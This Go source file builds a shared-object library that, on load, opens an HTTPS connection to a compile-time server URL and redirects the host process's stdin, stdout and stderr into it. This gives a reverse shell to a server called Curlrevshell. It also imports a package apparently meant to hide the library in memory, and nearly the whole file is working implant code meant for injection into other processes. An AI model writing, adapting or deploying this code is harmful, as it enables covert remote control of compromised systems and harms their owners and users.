// Library curlrevshell_https is a shared object file which hooks up stdio to
// Curlrevshell via HTTPS.
package main

/*
 * curlrevshell_https.go
 * Hook up stdio to Curlrevshell via HTTPS
 * By J. Stuart McMurray
 * Created 20250802
 * Last Modified 20250806
 */

import (
	"io"
	"log"
	"net/http"
	"os"
	"syscall"
	"time"

	_ "github.com/magisterquis/sneaky_remap"
)

// Compile-time config.
var (
	// PinnedPukKey is what's normally passed to curl's --pinnedpubkey.
	PinnedPubKey string
	// URL is the URL to the server, including /io.
	URL string
)

// init HTTPSs back to Curlrevshell and hooks up stdio to the connection.
func init() {
	/* Make sure we have a pinnedpubkey and URL */
	if "" == PinnedPubKey {
		log.Printf("Need a --pinnedpubkey")
		return
	} else if "" == URL {
		log.Printf("Need a URL")
		return
	}

	/* Pubkey-specific HTTP client. */
	c, err := NewHTTPClient(PinnedPubKey)
	if nil != err {
		log.Printf("Error configuring HTTPS client: %s", err)
		return
	}

	/* Pipes to hook up to stdio. */
	inr, inw, err := os.Pipe()
	if nil != err {
		log.Printf("Error allocating stdin pipe: %s", err)
		return
	}
	outr, outw, err := os.Pipe()
	if nil != err {
		log.Printf("Error allocating stdout/stderr pipe: %s", err)
		return
	}

	/* Connect to the server, killing the connection when the context
	comes done. */
	req, err := http.NewRequest(http.MethodPost, URL, outr)
	if nil != err {
		log.Printf("Error configuring request: %s", err)
		return
	}
	res, err := c.Do(req)
	if nil != err {
		log.Printf("Error connecting to server at %s: %s", URL, err)
		return
	}
	defer res.Body.Close()

	/* Hook up the pipes to stdio. */
	if err := syscall.Dup3(
		int(inr.Fd()),
		int(os.Stdin.Fd()),
		0,
	); nil != err {
		log.Printf("Error taking over stdin: %s", err)
		return
	}
	if err := syscall.Dup3(
		int(outw.Fd()),
		int(os.Stdout.Fd()),
		0,
	); nil != err {
		log.Printf("Error taking over stdout: %s", err)
		return
	}
	if err := syscall.Dup3(
		int(outw.Fd()),
		int(os.Stderr.Fd()),
		0,
	); nil != err {
		log.Printf("Error taking over stderr: %s", err)
		return
	}
	/* Which means the below log.Printf's are kinda silly... */

	/* Start proxying. */
	n, err := io.Copy(inw, res.Body)
	if nil != err {
		log.Printf(
			"Error proxying stdin after %d bytes: %s",
			n,
			err,
		)
	}
	inw.Close()
	time.Sleep(time.Second)
	log.Printf("Done")
}

// main is required to be defined, but unused.
func main() {}
